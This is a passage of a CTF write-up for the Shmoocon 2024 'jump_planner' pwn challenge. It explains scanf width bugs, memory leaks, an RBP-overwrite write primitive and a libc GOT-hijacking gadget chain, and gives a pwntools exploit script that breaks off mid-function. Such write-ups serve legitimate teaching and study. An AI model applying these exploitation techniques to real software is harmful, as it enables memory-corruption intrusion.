+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(index))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; Year &quot;</span><span>)
+</span><span>    leak </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span>))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span>leak
+</span></code></pre>
+<p>The second major bug was present in manual_jump. A user provided length was used for scanf %s width and the bounds checking was insufficient. The width was limited to a maximum of 0x1e but there were no limits on the lower bound allowing for 0 or negative %s widths.  There are two ways to take advantage of this (that i'm aware of) -- a width of 0 (%0s) is equivalent to %s (causing a stack buffer overflow) and a width of -1 (%-1s) will not read bytes or place a terminating null byte.</p>
+<p>I used %-1s to leak a stack pointer from the now uninitialized buffer like so:</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1337&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-1&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A5&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Year 1337 at &quot;</span><span>)
+</span><span>manual_jump_rbp </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&#39;</span><span>)) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x118
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span></code></pre>
+<p>I used %0s to build a write primitive. Due to the shadow stack I was unable to ROP and achieving code execution was nontrivial. With our previous leaks we can overflow past the saved RIP and canary -- and then modify the saved RBP. Once we return to the caller function local variables are referenced relative to RBP -- and we can easily build an arbitrary write primitive in many different ways.  I chose to use manual_jump so that after the write I could use the buffer overflow to repair RBP to the original value.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">manual_jump_rbp_overwrite</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">year</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">target</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">False</span><span>):
+</span><span>        encoded_rbp </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(target </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x34</span><span>)
+</span><span>        </span><span style="color:#ffa759;">if b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x0c</span><span style="color:#bae67e;">&#39; </span><span style="color:#f29e74;">in </span><span>encoded_rbp </span><span style="color:#f29e74;">or </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x20</span><span style="color:#bae67e;">&#39; </span><span style="color:#f29e74;">in </span><span>encoded_rbp </span><span style="color:#f29e74;">or </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;&#39;</span><span>:
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;cant do whitespace :(&quot;</span><span>)
+</span><span>            </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(year))
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">flat</span><span>({
+</span><span>            </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0x5add011</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2cc;">: </span><span>manual_jump_rbp</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x48</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">40</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0x41414141 </span><span style="color:#ffa759;">if </span><span>should_fault </span><span style="color:#ffa759;">else </span><span>canary</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">48</span><span style="color:#ccc9c2cc;">: </span><span>target </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x34</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">56</span><span style="color:#ccc9c2cc;">: </span><span>pie_base</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">0x193e</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">80</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0x6942069420</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,
+</span><span>            </span><span style="color:#ffcc66;">200</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;please_give_me_flag</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        }</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">length</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">256</span><span>))
+</span><span>        </span><span style="color:#ffa759;">try</span><span>:
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">except</span><span>: </span><span style="font-style:italic;color:#5c6773;"># recvuntil will eof after it has crashed
+</span><span>            </span><span style="color:#ffa759;">pass
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">write_u32</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">address</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">value</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">False</span><span>):
+</span><span>        log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;writing u32 </span><span>{</span><span style="color:#f28779;">hex</span><span>(value)}</span><span style="color:#bae67e;"> to </span><span>{</span><span style="color:#f28779;">hex</span><span>(address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        </span><span style="color:#ffd580;">manual_jump_rbp_overwrite</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>address)
+</span><span>        </span><span style="color:#ffd580;">manual_jump_rbp_overwrite</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>value </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffffffff</span><span style="color:#ccc9c2cc;">, </span><span>manual_jump_rbp</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span>should_fault)
+</span></code></pre>
+<h3 id="arbitrary-write-now-what">arbitrary write... now what?</h3>
+<p>At this point we have the following capabilities:</p>
+<ul>
+<li>leak of a .text pointer, a libc pointer, and a stack pointer</li>
+<li>arbitrary write of a u32</li>
+<li>although I did not need it, the list function can be used for an arbitrary u32</li>
+</ul>
+<p>In most cases the challenge would be essentially over -- arbitrary write is a powerful primitive, right?  Just drop a one gadget over function pointers until something matches the constraints?  In this case we're still at the beginning of the challenge.  As mentioned earlier, the binary is running inside QEMU with a plugin that does three things:</p>
+<ul>
+<li>implement a shadow stack</li>
+<li>block execve</li>
+<li>add a backdoor syscall to print the flag</li>
+</ul>
+<p>To get the flag we need to be able to make a syscall with control of the first two arguments -- controlling rax, rdi, and rsi (or use the libc syscall function and control rdi, rsi, and rdx).  However, the tools to do that are extremely scarce.  I was stuck here for a long time with many failed approaches. After many failed approaches I came across a writeup on <a href="https://github.com/n132/Libc-GOT-Hijacking/blob/main/Post/README.md">libc GOT hijacking</a>.  I'm familiar with the use of the libc GOT as a replacement for free_hook/malloc_hook to call a controlled function but I'd never considered using it for a code reuse attack.</p>
+<p>The technique is roughly similar to GOP/JOP except it uses calls into the GOT as the method of directing control flow.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>&gt; cargo run -- ~/chrononaut-shmoo-24/time_jump/jump_planner_release/libc.so.6 | wc -l
+</span><span>34704
+</span></code></pre>
+<p>For example, this is the first gadget of my chain which I used to shift the stack upwards to the controlled area:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>000d059b  4881c4f8000000     add     rsp, 0xf8
+</span><span>000d05a2  5b                 pop     rbx {__saved_rbx}
+</span><span>000d05a3  5d                 pop     rbp {__saved_rbp}
+</span><span>000d05a4  415c               pop     r12 {__saved_r12}
+</span><span>000d05a6  415d               pop     r13 {__saved_r13}
+</span><span>000d05a8  415e               pop     r14 {__saved_r14}
+</span><span>000d05aa  415f               pop     r15 {__saved_r15}
+</span><span>000d05ac  e90f80f5ff         jmp     jumps_wcscmp
+</span></code></pre>
+<p>The address of the next gadget would be placed in the GOT entry for wcscmp, which would end in a call to another GOT entry and so on.</p>
+<p>This technique has a rather significant fundamental limitation in that each GOT entry can only be used once or you'll create a cycle -- but in practice I found that wasn't a huge issue and it was relatively straightforward to control the first three arguments (at which point you could instead call mprotect and run shellcode).  The larger limitation is that you can't clobber a GOT entry if your write primitive calls it or you'll trigger your chain early and likely crash. I did this manually as I was writing my chain but it should be easy enough to automate in GDB (drop a tracepoint on each plt stub and check hitcounts?  The GDB plugin API should be sufficient... I'll probably write something up when I have time) and exclude those gadgets.</p>
+<h3 id="building-the-chain">Building the chain</h3>
+<p>As mentioned earlier, my first gadget was intended to shift the stack to the controlled area.  Although some registers were set, the data on stack was uncontrolled.  Coincidentally, this gadget left rsp pointing directly to the start of the controlled stack data.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>000d059b  4881c4f8000000     add     rsp, 0xf8
+</span><span>000d05a2  5b                 pop     rbx {__saved_rbx}
+</span><span>000d05a3  5d                 pop     rbp {__saved_rbp}
+</span><span>000d05a4  415c               pop     r12 {__saved_r12}
+</span><span>000d05a6  415d               pop     r13 {__saved_r13}
+</span><span>000d05a8  415e               pop     r14 {__saved_r14}
+</span><span>000d05aa  415f               pop     r15 {__saved_r15}
+</span><span>000d05ac  e90f80f5ff         jmp     jumps_wcscmp
+</span></code></pre>
+<p>My second gadget was intended to populate rdx with 0x6942069420 -- the magic value for the second argument to the backdoor function. My stack control used sprintf which limited the bytes which could be written to non-whitespace bytes. I used this gadget which read data from the stack and then added 1 to rdx.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>0005139f  488b542450         mov     rdx, qword [rsp+0x50 {var_878_1}]
+</span><span>000513a4  4b8d3c08           lea     rdi, [r8+r9]
+</span><span>000513a8  4c89fe             mov     rsi, r15
+</span><span>000513ab  48894c2440         mov     qword [rsp+0x40 {var_888_4}], rcx
+</span><span>000513b0  4c894c2420         mov     qword [rsp+0x20 {var_8a8_6}], r9
+</span><span>000513b5  4883c201           add     rdx, 0x1
+</span><span>000513b9  4c89442428         mov     qword [rsp+0x28 {var_8a0_6}], r8
+</span><span>000513be  e86d70fdff         call    jumps_memmove
+</span></code></pre>
+<p>The next gadget popped from the stack into a variety of registers -- although none of these registers are directly used in the backdoor call I found a couple gadgets which moved from r registers.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>0013076c  5b                 pop     rbx {__saved_rbx}
+</span><span>0013076d  5d                 pop     rbp {__saved_rbp}
+</span><span>0013076e  415c               pop     r12 {__saved_r12}
+</span><span>00130770  415d               pop     r13 {__saved_r13}
+</span><span>00130772  415e               pop     r14 {__saved_r14}
+</span><span>00130774  e9077eefff         jmp     jumps___strcasecmp
+</span></code></pre>
+<p>The last two gadgets are fairly straightforward and just move from r13/r14 into rdi/rsi -- at which pointer we have set up registers appropriately and can call syscall.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>000c651c  4c89f6             mov     rsi, r14
+</span><span>000c651f  4889d7             mov     rdi, rdx
+</span><span>000c6522  4d01e6             add     r14, r12
+</span><span>000c6525  48891424           mov     qword [rsp {var_1a8}], rdx
+</span><span>000c6529  e85221f6ff         call    jumps_wcsnlen
+</span><span>    
+</span><span>0011de45  4c89ef             mov     rdi, r13
+</span><span>0011de48  41bc01000000       mov     r12d, 0x1
+</span><span>0011de4e  e89da7f0ff         call    jumps_rindex    
+</span></code></pre>
+<p>I used __stack_chk_fail to trigger my GOP chain because it is a relatively simple function with a slim stack frame which made it easier to access the controlled section of the stack from the gadgets. On the last write when the start of the chain was written I intentionally corrupted the canary to start the chain with a shorter stack frame.</p>
+<h3 id="notes-thoughts-other-approaches">notes, thoughts, other approaches</h3>
+<p>It's worth noting that this type of attack isn't limited to just libc -- it can be applied to any ELF with a writeable (non full RELRO) GOT (although in practice libc is big and consistently available).  If a more complex chain were needed and more libraries were available then a chain could be built across multiple library GOT sections.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>cargo run -- ~/chrononaut-shmoo-24/time_jump/jump_planner_release/ld-linux-x86-64.so.2 | wc -l 
+</span><span>1395
+</span></code></pre>
+<p>I had a lot of trouble with whitespace management.  The <a href="https://debugmen.dev/pwn/2024/01/15/jump-planner.html">author writeup</a> used a double call gadget to call gets at the start -- leaving a much more manageable constraint (no newlines)</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>001187f2  e839fcf0ff         call    jump_memmove
+</span><span>001187f7  be2f000000         mov     esi, 0x2f
+</span><span>001187fc  4c89ef             mov     rdi, r13
+</span><span>001187ff  e8ecfdf0ff         call    jump_strrchr
+</span></code></pre>
+<p>Although during the event I found gadgets using a binary ninja script -- after the fact I wrote <a href="https://github.com/tsheinen/gopper/">a gadget finder</a> which has no proprietary dependencies and can find gadgets including partial instructions.  I make no promises about code quality, general maintained-ness, or really anything -- i just thought it would be cool and slammed it together but im super busy :(</p>
+<p>This was a challenge from the Battelle booth at Shmoocon 2024 -- I like <a href="https://heinen.dev/battelle-winter-2022/holy-grail-of-rop/">their recruiting CTF challenges</a> and generally learn something cool when solving them.  Also they gave out a really cool badge. If you're interested you can find their cybersecurity careers page <a href="https://solvers.battelle.org/cyber-challenge">here</a>.  This is a no bias shill :) I do not work there.</p>
+<p><img src="/battelle-shmoocon-2024/battelle_shmoocon_badge.jpg" alt="a blue badge with LEDs which says Ohio Chrononaut Institute" /></p>
+<h3 id="final-script">final script</h3>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">##!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./jump_planner_patched&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>ld </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./ld-linux-x86-64.so.2&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;zellij&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;action&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;new-pane&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;right&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-c&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;--&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;zsh&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-c&quot;</span><span>]
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>bits </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">64
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>([</span><span style="color:#bae67e;">&#39;./run&#39;</span><span>])
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;jump.chrononaut.xyz&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5000</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">quick_jump_leak</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">index</span><span>):
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(index))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; Year &quot;</span><span>)
+</span><span>    leak </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span>))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">return </span><span>leak
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">chunks</span><span>(</span><span style="color:#ffcc66;">lst</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">n</span><span>):
+</span><span>    </span><span style="font-style:italic;color:#5c6773;">&quot;&quot;&quot;Yield successive n-sized chunks from lst.&quot;&quot;&quot;
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">len</span><span>(lst)</span><span style="color:#ccc9c2cc;">, </span><span>n):
+</span><span>        </span><span style="color:#ffa759;">yield </span><span>lst[i</span><span style="color:#ccc9c2cc;">:</span><span>i </span><span style="color:#f29e74;">+ </span><span>n]
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    R_DEBUG_OFFSET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x3b118
+</span><span>
+</span><span>    pie_base  </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">quick_jump_leak</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9</span><span>) </span><span style="color:#f29e74;">- </span><span>exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;main&#39;</span><span>]
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address  </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">quick_jump_leak</span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x29d90
+</span><span>    ld_address </span><span style="color:#f29e74;">= </span><span>libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x29a000
+</span><span>    canary </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">quick_jump_leak</span><span>(r</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">5</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1337&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-1&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A5&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Year 1337 at &quot;</span><span>)
+</span><span>    manual_jump_rbp </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&#39;</span><span>)) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x118
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&gt;&gt;&quot;</span><span>)
+</span><span>
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;manual_jump_rbp @ </span><span>{</span><span style="color:#f28779;">hex</span><span>(manual_jump_rbp)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;pie_base @ </span><span>{</span><span style="color:#f28779;">hex</span><span>(pie_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;libc.address @ </span><span>{</span><span style="color:#f28779;">hex</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;canary @ </span><span>{</span><span style="color:#f28779;">hex</span><span>(canary)}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span>    
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">manual_jump_rbp_overwrite</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">year</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">target</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">should_fault</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">False</span><span>):
+</span><span>        encoded_rbp </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(target </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x34</span><span>)
+</span><span>        </span><span style="color:#ffa759;">if b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x0c</span><span style="color:#bae67e;">&#39; </span><span style="color:#f29e74;">in </span><span>encoded_rbp </span><span style="color:#f29e74;">or </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x20</span><span style="color:#bae67e;">&#39; </span><span style="color:#f29e74;">in </span><span>encoded_rbp </span><span style="color:#f29e74;">or </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;&#39;</span><span>:
+</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;cant do whitespace :(&quot;</span><span>)
+</span><span>            </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(year))
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffd580;">flat</span><span>({
